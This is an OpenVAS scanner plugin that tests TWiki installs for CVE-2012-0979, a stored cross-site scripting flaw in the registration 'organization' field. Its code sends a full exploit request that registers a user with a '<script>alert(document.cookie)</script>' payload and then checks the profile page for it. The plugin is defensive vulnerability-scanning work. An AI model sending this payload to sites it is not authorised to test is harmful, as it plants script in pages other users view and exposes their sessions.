###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_twiki_organization_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# TWiki 'organization' Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:twiki:twiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802391");
  script_version("$Revision: 13659 $");
  script_bugtraq_id(51731);
  script_cve_id("CVE-2012-0979");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-03-20 12:04:55 +0530 (Tue, 20 Mar 2012)");

  script_name("TWiki 'organization' Cross-Site Scripting Vulnerability");

  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_mandatory_keys("twiki/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"TWiki version 5.1.1 and prior");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input
  to the 'organization' field when registering or editing a user, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"The host is running TWiki and is prone to cross site scripting
  vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47784");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72821");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1026604");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51731/info");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109246/twiki-xss.txt");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! twikiPort = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:twikiPort ) ) exit( 0 );

if( dir == "/" ) dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:twikiPort);

url = dir + "/register/Main/WebHome";

postdata = "crypttoken=ad240d2a0504042701980e88c85bbc33&Twk1FirstName=ccc&Twk1" +
           "LastName=ccc&Twk1WikiName=CccCcc&Twk1Email=ccc%40ccc.com&Twk0"      +
           "Password=ccc&Twk0Confirm=ccc&Twk0OrganisationName=%3Cscript%3E"     +
           "alert%28document.cookie%29%3B%3C%2Fscript%3E&Twk0OrganisationURL="  +
           "&Twk1Country=Belize&Twk0Comment=&rx=%25BLACKLISTPLUGIN%7B+action"   +
           "%3D%22magic%22+%7D%25&topic=TWikiRegistration&action=register";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);
res = http_keepalive_send_recv(port:twikiPort, data:req);

if (res) {
  url = dir + "/view/Main/CccCcc";

  if(http_vuln_check(port:twikiPort, url:url, pattern:"<script>alert" +
                           "\(document.cookie\);</script>", check_header:TRUE)) {
    report = report_vuln_url( port:twikiPort, url:url );
    security_message(port:twikiPort, data:report);
    exit(0);
  }
}

exit(99);
